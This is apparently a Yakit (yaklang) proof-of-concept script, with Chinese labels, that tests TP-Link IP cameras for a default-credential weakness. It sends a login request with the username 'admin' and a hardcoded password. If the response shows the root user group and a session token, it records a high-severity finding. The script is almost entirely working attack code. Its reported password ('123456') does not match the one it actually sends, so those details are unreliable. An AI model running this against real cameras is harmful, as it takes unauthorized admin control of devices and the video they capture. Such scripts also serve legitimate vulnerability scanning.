script_name: tp link网络摄像头默认密钥漏洞
content:
##server:TP-LINK摄像头
##type:poc
##params:root_url
##name:tp_link_ip_camera_default_credential_poc
##severity:high
##out_put:tp_link_ip_camera_username,tp_link_ip_camera_password



yakit.AutoInitYakit()
log.setLevel("info")

poc=func(addr){
    isTls = str.IsTLSServer(addr)
    packet=`GET / HTTP/1.1
Host: {{params(addr)}}
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36

{"method":"do","login":{"username":"admin","password":"0KcgeXhc9TefbwK"}}`


    rsp,req,err=poc.HTTP(packet,
    poc.https(isTls),
    poc.params({"addr":addr}),
    )
    if err != nil {
        die(err)
    }
    if str.MatchAllOfSubString(rsp, [`HTTP/1.1 200`,`"user_group": "root"`]...){
        rsp_header,rsp_body=poc.Split(rsp)
        json_data=json.loads(rsp_body)
        if len(json_data["stok"])>0{
            risk.NewRisk(
                root_url,
                risk.severity("high"), 
                risk.title(f"FOUND ${root_url} 存在tp link网络摄像头默认密钥漏洞"), 
                risk.titleVerbose("tp link网络摄像头默认密钥漏洞"), 
                risk.type("身份伪造"), 
                risk.typeVerbose("配置错误"), 
                risk.details({"tp_link_ip_camera_username":"admin","tp_link_ip_camera_password":"123456"}),             
                )            
        }
    }
    
}




root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}
addr = str.HostPort(ip, port)
poc(addr)
